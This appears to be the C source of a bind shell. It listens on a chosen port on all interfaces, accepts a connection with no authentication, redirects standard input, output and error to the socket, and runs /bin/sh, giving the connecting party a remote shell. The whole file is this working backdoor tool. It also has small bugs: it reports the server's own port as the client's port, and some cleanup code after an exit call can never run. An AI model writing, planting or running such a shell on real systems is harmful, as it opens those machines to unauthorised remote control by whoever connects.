#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/socket.h>
#include <unistd.h>

void error(char *message)
{
	perror(message);
	exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
	int sockfd, newsockfd, portno, clilen, servlen;
	struct sockaddr_in serv_addr, cli_addr;

	// Check if port is provided
	if (argc < 2)
	{
		fprintf(stderr, "Usage: %s <port>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	// Create socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
	{
		error("ERROR opening socket");
	}

	// Set up server address
	bzero((char *) &serv_addr, sizeof(serv_addr));
	portno = atoi(argv[1]);
	serv_addr.sin_port = htons(portno);
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;

	// Bind socket
	if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
	{
		error("ERROR binding socket");
	}

	// Listen for incoming connections
	listen(sockfd,0);

	printf("%s : listening for incoming connections "
    "on all interfaces, port %d.\n", argv[0], ntohs(serv_addr.sin_port));

	// Accept connection
	clilen = sizeof(cli_addr);
	newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
	if (newsockfd < 0)
	{
		error("ERROR accepting connection");
	}
   
	// Convert client IP address to string
	char cli_ip[INET_ADDRSTRLEN];
	if (inet_ntop(AF_INET, &(cli_addr.sin_addr), cli_ip, INET_ADDRSTRLEN) == NULL)
	{
		error("ERROR converting client IP");
	}
	// Get client's address
    if (getsockname(newsockfd, (struct sockaddr *) &cli_addr, &clilen) < 0)
	{
		error("ERROR getting client address");
	}
	int cli_port = ntohs(cli_addr.sin_port);
	// Print connection details from client
	printf("Connection from [%s] %d.\n", cli_ip, cli_port);

	// Get server's address
	servlen = sizeof(serv_addr);
	if (getsockname(newsockfd, (struct sockaddr *)&serv_addr, &servlen) < 0)
	{
		error("ERROR getting server address");
	}
	// Convert server IP address to string
	char serv_ip[INET_ADDRSTRLEN];
	if (inet_ntop(AF_INET, &(serv_addr.sin_addr), serv_ip, INET_ADDRSTRLEN) == NULL)
	{
		error("ERROR converting server IP");
	}
	// Send connection message to client
	char n[64] = {0};
	snprintf(n, sizeof(n), "Connection to %s established.\n", serv_ip);
	if (write(newsockfd, n, sizeof(n)) < 0)
	{
		error("ERROR writing to socket");
	}

	// Redirect file descriptors
	for (int i = 0; i < 3; i++)
	{
		if (dup2(newsockfd, i) < 0)
		{
			error("ERROR redirecting file descriptors");
			if (close(newsockfd) < 0)
			{
				error("ERROR closing newsockfd");
			}
    	}
	}
	if (close(newsockfd) < 0)
	{
      error("ERROR closing newsockfd");
	}

	// Execute shell
	char *args[] = {"/bin/sh", NULL};
	if (execve("/bin/sh", args, NULL) < 0)
	{
		error("ERROR executing shell");
	}
	return 0;
}
